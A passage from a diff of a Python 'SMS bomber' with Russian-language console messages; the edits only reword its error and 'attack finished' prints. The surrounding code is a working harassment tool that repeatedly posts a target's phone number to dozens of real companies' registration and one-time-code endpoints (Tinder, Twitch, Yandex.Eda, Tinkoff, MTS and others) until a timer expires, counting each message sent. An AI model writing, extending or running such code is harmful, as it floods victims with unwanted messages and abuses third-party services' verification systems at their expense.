+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
@@ -9092,11 +9092,11 @@ if call == str(2):
             R = R + 1
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -9104,11 +9104,11 @@ if call == str(2):
             R = R + 1
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -9117,11 +9117,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -9129,44 +9129,44 @@ if call == str(2):
             R = R + 1
             print('[+] OK отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://plink.tech/register/', json={"phone": _phone})
             R = R + 1
             print('[+] Plink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -9174,11 +9174,11 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -9188,11 +9188,11 @@ if call == str(2):
             R = R + 1
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -9200,10 +9200,10 @@ if call == str(2):
             R = R + 1
             print('[+] CabWiFi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -9211,11 +9211,11 @@ if call == str(2):
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -9224,22 +9224,22 @@ if call == str(2):
             R = R + 1
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -9249,33 +9249,33 @@ if call == str(2):
             R = R + 1
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -9286,10 +9286,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -9298,10 +9298,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -9309,10 +9309,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -9321,10 +9321,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -9332,10 +9332,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -9345,10 +9345,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -9356,10 +9356,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -9368,10 +9368,10 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -9380,7 +9380,7 @@ if call == str(2):
             time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -9388,10 +9388,10 @@ if call == str(2):
             print('[+] RuTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправлено !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
@@ -9399,10 +9399,10 @@ if call == str(2):
             print('[+] BelkaCar отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправленo !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://starpizzacafe.com/mods/a.function.php',
@@ -9411,10 +9411,10 @@ if call == str(2):
             print('[+] StarPizzaCafe отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -9423,10 +9423,10 @@ if call == str(2):
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
@@ -9434,10 +9434,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -9446,10 +9446,10 @@ if call == str(2):
             print('[+] Tinkoff отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -9458,10 +9458,10 @@ if call == str(2):
             print('[+] Dostavista отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -9471,10 +9471,10 @@ if call == str(2):
             print('[+] MonoBank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -9483,10 +9483,10 @@ if call == str(2):
             print('[+] binotel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
@@ -9495,10 +9495,10 @@ if call == str(2):
             print('[+] SportMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -9507,10 +9507,10 @@ if call == str(2):
             print('[+] Alfalife отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
@@ -9518,10 +9518,10 @@ if call == str(2):
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://silpo.ua/graphql', data={
@@ -9531,10 +9531,10 @@ if call == str(2):
             print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
@@ -9542,10 +9542,10 @@ if call == str(2):
             print('[+] BTfair отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone',
@@ -9555,10 +9555,10 @@ if call == str(2):
             print('[+] GGbet отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-]  не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.etm.ru/cat/runprog.html',
@@ -9568,10 +9568,10 @@ if call == str(2):
             print('[+] ETM отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -9580,10 +9580,10 @@ if call == str(2):
             print('[+] TheLive отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
@@ -9591,10 +9591,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
@@ -9605,7 +9605,7 @@ if call == str(2):
             print('[+] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://zoloto585.ru/api/bcard/reg/',
@@ -9616,10 +9616,10 @@ if call == str(2):
             print('[+] Zoloto585 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
@@ -9627,10 +9627,10 @@ if call == str(2):
             print('[+] Kasta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Kasta Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
@@ -9639,10 +9639,10 @@ if call == str(2):
             print('[+] Тaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -9652,10 +9652,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.creditter.ru/confirm/sms/send',
@@ -9664,10 +9664,10 @@ if call == str(2):
             print('[+] Creditter отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
@@ -9680,10 +9680,10 @@ if call == str(2):
             print('[+] Ingos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://win.1admiralxxx.ru/api/en/register.json',
@@ -9693,10 +9693,10 @@ if call == str(2):
             print('[+] Admiralxxx отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
@@ -9704,10 +9704,10 @@ if call == str(2):
             print('[+] Av отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -9716,10 +9716,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
@@ -9727,10 +9727,10 @@ if call == str(2):
             print('[+] City24 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
@@ -9738,10 +9738,10 @@ if call == str(2):
             print('[+] SushiMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
@@ -9749,10 +9749,10 @@ if call == str(2):
             print('[+] MultiPlex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
@@ -9760,10 +9760,10 @@ if call == str(2):
             print('[+] 3040 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.niyama.ru/ajax/sendSMS.php',
@@ -9772,10 +9772,10 @@ if call == str(2):
             print('[+] Niyama отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Niyama не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
@@ -9783,10 +9783,10 @@ if call == str(2):
             print('[+] VSK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] VSK не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
@@ -9794,10 +9794,10 @@ if call == str(2):
             print('[+] EasyPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://fix-price.ru/ajax/register_phone_code.php',
@@ -9806,10 +9806,10 @@ if call == str(2):
             print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
